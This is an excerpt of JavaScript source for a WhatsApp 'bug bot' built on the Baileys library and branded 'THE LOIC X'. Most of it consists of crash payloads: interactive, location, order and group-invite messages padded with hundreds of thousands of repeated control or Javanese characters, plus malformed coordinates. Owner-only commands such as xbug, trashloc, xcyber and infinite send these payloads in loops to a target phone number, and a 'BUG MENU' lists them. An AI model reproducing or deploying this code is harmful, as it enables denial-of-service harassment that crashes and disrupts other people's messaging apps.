...
async function TxOs(X, Ptcp = false) {
			...
			console.log(chalk.green("⚙️ 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆 𝐁𝐘 𝐋𝐎𝐈𝐂𝐙𝐙 👾〽️"));
		};
						...
						message: {
							interactiveMessage: {
								...
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '👾 𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇 👾', url: \"https://youtube.com/JACKTHEXBEC\", merchant_url: \"https://youtube.com/JACKTHEXBEC\" }",
										},
										{
			...
			message: {
				"interactiveResponseMessage": {
					...
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐋𝐎𝐈𝐂 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@JackV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"@𝐋𝐨𝐢𝐜𝐙𝐳 𝐙𝐍𝐗̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		...
		const EsQl = {
			...
			message: {
				"interactiveResponseMessage": {
					...
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐋𝐎𝐈𝐂 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝐉𝐚𝐜𝐤𝐕𝟐\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"@𝐋𝐨𝐢𝐜𝐙𝐳 𝐙𝐍𝐗̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		...
		const VisiX = {
			...
			message: {
				"interactiveResponseMessage": {
					...
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐋𝐎𝐈𝐂 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@JackV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"@𝐋𝐨𝐢𝐜𝐙𝐳 𝐙𝐍𝐗̤${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
					...
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								...
								nativeFlowMessage: {
									messageParamsJson: " 👾 𝐋𝐎𝐈𝐂 👾 𝐁𝐔𝐆 𝐕𝟐〽️ ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": "👾 𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇 👾",
												"sections": [{
													"title": "𝐋𝐎𝐈𝐂 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ",
													"rows": []
												}]
											}
										},
				...
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "@𝐋𝐨𝐢𝐜𝐙𝐳 𝐙𝐍𝐗̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + "ꦾ".repeat(77777),
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "👾 𝐋𝐎𝐈𝐂 👾〽️",
							...
							interactiveMessage: {
								...
								nativeFlowMessage: {
									...
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👾 𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇 👾" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐋𝐎𝐈𝐂 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										...
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👾 𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇 👾\",\"sections\":[{\"title\":\"𝐋𝐎𝐈𝐂 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
					...
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								...
								body: {
									text: "@𝐋𝐨𝐢𝐜𝐙𝐳 𝐙𝐍𝐗̤" + "ꦾ".repeat(77777)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
					...
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								...
								body: {
									text: "@𝐋𝐨𝐢𝐜𝐙𝐳 𝐙𝐍𝐗̤" + "ꦾ".repeat(50000)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
			...
			VxoZap.relayMessage(jid, {
				'extendedTextMessage': {
					...
					'contextInfo': {
						...
						'participant': jid,
						'quotedMessage': {
							'conversation': '@𝐋𝐨𝐢𝐜𝐙𝐳 𝐙𝐍𝐗̤' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
					...
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								...
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐋𝐎𝐈𝐂 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👾 𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇 👾" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐋𝐎𝐈𝐂 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ\",\"rows\":[]}]}"
		...
		const zets = {
			...
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: V1,
					itemCount: `999991992929`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `𝐓𝐇𝐄 𝐋𝐎𝐈𝐂 𝐗〽️`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
...
║▬▭▬▭▬▭▬▭▬▭
│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝐓𝐙𝐘 + 𝐑𝐄𝐍𝐀𝐌𝐄\`\𐁘
│🎭 𝐎𝐰𝐧 𝐍𝐨 : ∞
║🎭 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 𝐆𝐞𝐭 𝐋𝐨𝐢𝐜🐉 」▭▬
║› 𝐓𝐇𝐄 𝐋𝐎𝐈𝐂 𝐗 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣`
			let MSG = `
╭──(         𝐋𝐎𝐈𝐂 𝐙𝐀𝐏         )
║ᨒ 𝐓𝐇𝐄 𝐋𝐎𝐈𝐂 𝐗\`\〽️
            ...
            "rows": [
                {
                    ...
                    "id": "dosweb"
									...
									"name": "cta_url",
									"buttonParamsJson": "{\"display_text\":\"𝐓𝐇𝐄 𝐋𝐎𝐈𝐂 𝐗🐉\",\"url\":\"https://youtube.com/@PakTzy\",\"merchant_url\":\"https://youtube.com/@PakTzy\"}"
								}]
							}
						}
					}
					...
					"message": {
						"interactiveMessage": {
							...
							"nativeFlowMessage": {
								"buttons": [{
									"name": "quick_reply",
									"buttonParamsJson": "{\"display_text\":\"𝐋𝐎𝐈𝐂 𝐙𝐀𝐏\",\"id\":\".xowner\"}"
								}]
							}
						}
					}
...
╔─═⊱ *「 \`BUG MENU\` 」* ─═⬣
│┏⊱
║⿻ 𝐍𝐎𝐓𝐄 : 𝐕𝐈𝐓𝐔𝐑 𝐃𝐈 𝐒𝐈𝐍𝐈 𝐆𝐊 𝐖𝐎𝐑𝐊 𝐀𝐓𝐀𝐔 𝐆𝐈𝐍𝐀𝐍𝐀 𝐆𝐈𝐓𝐔 𝐋𝐀𝐇 𝐒𝐎𝐀𝐋𝐍𝐘𝐀 𝐆𝐔𝐀 𝐇𝐀𝐏𝐔𝐒 🗿🗿
║⿻ 𝐕𝐏𝐀𝐘
│⿻ 𝐙𝐄𝐑𝐎𝐁𝐔𝐆
║⿻ 𝐙𝐀𝐏
│⿻ 𝐋𝐎𝐗𝐀𝐒
...
`
		...
		case 'xbug': {
					...
					viewOnceMessage: {
						message: {
							...
							interactiveMessage: proto.Message.InteractiveMessage.create({
								...
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: `⿻  ⌜ 𝐋𝐎𝐈𝐂 𝐕𝐎𝐈𝐃 𝐑𝐄𝐍𝐀𝐌𝐖 ⌟  ⿻`
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `\n🩸𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇 ϟ🦠\n›› 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆𝐆 : ${incTarget}\n`,
									subtitle: `️`,
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
			...
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Extended 62xx_\n\n𝐓𝐇𝐄 𝐋𝐎𝐈𝐂 𝐗🐉`)
			let X = incTarget + '@s.whatsapp.net';
			if (owner.includes(incTarget)) {
				zreply('> 𝐆𝐀𝐆𝐀𝐋 𝐌𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐊𝐄 𝐎𝐖𝐍𝐄𝐑!!')
			} else {
				zreply(`*> 𝐒𝐄𝐃𝐀𝐍𝐆 𝐌𝐄𝐍𝐆𝐈𝐑𝐈𝐌⚡*`)
				global.jumlah = text.split("|")[1]
					for (let i = 0; i < 2; i++) {
							...
							message: {
								...
								interactiveMessage: proto.Message.InteractiveMessage.create({
									...
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇\",\"id\":\"\"}`
										}, ],
									})
								})
							}
			...
			case 'trashloc': {
				if (!isCreator) return zreply(mess.owner)
			if (!q) return zreply(`*Syntax Error!*\n\n_Use : 𝐒𝐚𝐥𝐚𝐡 𝐏𝐞𝐧𝐠𝐠𝐮𝐧𝐚𝐚𝐧 𝐂𝐨𝐧𝐭𝐨𝐡 𝐆𝐮𝐧𝐚𝐤𝐚𝐧 \n\n 𝐗𝐛𝐮𝐠 𝟔𝟐𝟖𝐱𝐱𝐱 \n\n𝐓𝐇𝐄 𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇𝐇🐉`);
			let {
				proto,
				generateWAMessageFromContent
			} = require('@whiskeysockets/baileys')
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return zreply(`*𝐒𝐲𝐧𝐭𝐚𝐱 𝐄𝐫𝐫𝐨𝐫!*\n\n_𝐔𝐬𝐞 : 𝐒𝐚𝐥𝐚𝐡 𝐏𝐞𝐧𝐠𝐠𝐮𝐧𝐚𝐚𝐧 𝐂𝐨𝐧𝐭𝐨𝐡 𝐆𝐮𝐧𝐚𝐤𝐚𝐧 \n\n 𝐗𝐛𝐮𝐠 𝟔𝟐𝟖𝐱𝐱𝐱 \n\n𝐓𝐇𝐄 𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇𝐇🐉`)
			let X = incTarget + '@s.whatsapp.net';
			if (owner.includes(incTarget)) {
				zreply('𝐆𝐀𝐆𝐀𝐋 𝐌𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐊𝐄 𝐎𝐖𝐍𝐄𝐑!!')
			} else {
							...
							message: {
								...
								interactiveMessage: proto.Message.InteractiveMessage.create({
									...
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"👾 𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇 👾\",\"id\":\"Suxoinfinity ${incTarget}\"}`
										}, ],
									})
								})
							}
							...
							message: {
								...
								interactiveMessage: proto.Message.InteractiveMessage.create({
									...
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"👾 𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇 👾\",\"id\":\"invisixinfinite ${incTarget}\"}`
										}, ],
									})
								})
							}
							...
							message: {
								...
								interactiveMessage: proto.Message.InteractiveMessage.create({
									...
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"👾 𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇 👾\",\"id\":\"Infinitevoid ${incTarget}\"}`
										}, ],
									})
								})
							}
							...
							message: {
								...
								interactiveMessage: proto.Message.InteractiveMessage.create({
									...
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"👾 𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇 👾\",\"id\":\"Flowinfinite ${incTarget}\"}`
										}, ],
									})
								})
							}
							...
							message: {
								...
								interactiveMessage: proto.Message.InteractiveMessage.create({
									...
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"👾 𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇 👾\",\"id\":\"flodui ${incTarget}\"}`
										}, ],
									})
								})
							}
		...
		case 'xcyber': {
			if (!isCreator) return zreply(mess.owner)
			if (!q) return zreply(`*𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍 𝐒𝐀𝐋𝐀𝐇 \n 𝐘𝐆 𝐁𝐄𝐍𝐀𝐑 𝐂𝐎𝐍𝐓𝐎𝐇 𝐍𝐘𝐀 : \n\nxcyber 𝟔𝟐𝟖𝐱𝐱𝐱\n🐉`);
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return zreply(`*𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍 𝐒𝐀𝐋𝐀𝐇 \n 𝐘𝐆 𝐁𝐄𝐍𝐀𝐑 𝐂𝐎𝐍𝐓𝐎𝐇 𝐍𝐘𝐀 : \n\nxcyber 𝟔𝟐𝟖𝐱𝐱𝐱\n🐉`)
			let target = incTarget + '@s.whatsapp.net'
			global.jumlah = text.split("|")[1]

			let sections = [{
					title: '⌜ ⚙️ 𝐋𝐄𝐕𝐈𝐀𝐓𝐇𝐀𝐍 ⚙️ ⌟',
					highlight_label: "🎭⃟༑⌁⃰𝐋𝐄𝐕𝐈𝐄𝐓𝐇𝐀𝐍🐉",
					rows: [{
						title: '⌁⃰[ ⚙️ 𝐋𝐄𝐕𝐈𝐀𝐓𝐇𝐀𝐍 ⚙️ ]༑',
						id: `levi ${incTarget}`
					}]
				},
				{
					highlight_label: "🎭⃟༑⌁⃰𝐂𝐘𝐁𝐄𝐑 𝐗🐉",
					rows: [{
						title: '⌁[ ⚙️ 𝐂𝐘𝐁𝐄𝐑 𝐗 𝐋𝐄𝐕𝐈𝐄𝐓𝐇𝐀𝐍 ⚙️]༑',
						id: `cyberx ${incTarget}`
					}]
				}
			]
		...
		case 'infinite': {
			...
			if (owner.includes(incTarget)) {
				...
				zreply(`*> 𝐒𝐄𝐃𝐀𝐍𝐆 𝐌𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝙄𝙣𝙛𝙞𝙣𝙞𝙩𝙮⚡*`)
				global.jumlah = text.split("|")[1]
				for (let i = 0; i < 20; i++) {
						...
						message: {
							...
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									...
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: '𝐋𝐎𝐈𝐂 𝐄𝐗𝐄𝐂𝐔𝐓𝐄𝐃 𝐕𝐀𝐔𝐋𝐓',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
						...
						message: {
							...
							interactiveMessage: proto.Message.InteractiveMessage.create({
								...
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"𝐋𝐎𝐈𝐂 𝐂𝐑𝐀𝐒𝐇\",\"id\":\"Infinite ${incTarget}\"}`
									}, ],
								})
							})
						}
						...
						message: {
							...
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									...
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: '🩸⃟༑⌁⃰⚙️ 𝐋𝐄𝐕𝐈𝐀𝐓𝐇𝐀𝐍 𝐗 ⚙️',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
								...
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐋𝐄𝐕𝐈𝐄𝐓𝐇𝐀𝐍 𝐗𝐗ཀ͜͡🐉\",\"id\":\"invisixinfinite ${incTarget}\"}`
									}, ],
								})
							})
						}
						...
						message: {
							...
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									...
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: '🩸⃟༑⌁⃰[ 𝐂𝐘𝐁𝐄𝐑 𝐗 ⚙️ ]🦠️',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
								...
								header: proto.Message.InteractiveMessage.Header.create({
									title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐂𝐘𝐁𝐄𝐑 𝐗 𝐀𝐋𝐋 ⚙️☠️ ⿻ ▾ ༑̴⟆̊⭑̤`,
									subtitle: "",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
								...
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐁𝐋𝐀𝐂𝐊 𝐇𝐎𝐋𝐄ཀ͜͡🐉\",\"id\":\"invisixinfinite ${incTarget}\"}`
									}, ],
								})
							})
						}
		...
		case "vpay": {
			...
			if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
				...
				if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length > 0) {
					await zreply("𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 :  " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" ") + "\n\n𝐆𝐀𝐆𝐀𝐋 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 :  " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
				} else if (input.filter((x) => !failed.includes(x)).length > 0 && input.filter((x) => failed.includes(x)).length == 0) {
					await zreply("𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 :  " + input.filter((x) => !failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
				} else if (input.filter((x) => !failed.includes(x)).length == 0 && input.filter((x) => failed.includes(x)).length > 0) {
					await zreply("𝐆𝐀𝐆𝐀𝐋 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 :  " + input.filter((x) => failed.includes(x)).map((x) => "@" + x.split("@")[0]).join(" "))
				}
			} else if (db.data.settings[botNumber].autoButton) {
		...
		case "zap": {
			...
			if (successList.length > 0 && failedList.length > 0) {
				await zreply("𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 :  " +
				...
				await zreply("𝐆𝐀𝐆𝐀𝐋 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 :  " +
					failedList.map(x => "@" + x.split("@")[0]).join(" "))
			}
		}
		break
					...
					for (let j = 0; j < (Number(count) * 100); j++) {
						var msg = generateWAMessageFromContent(text, proto.Message.fromObject({
							groupInviteMessage: {
								...
								groupName: "𝐓𝐇𝐄 𝐋𝐎𝐈𝐂 𝐗🐉" + "\u0000".repeat(900000),
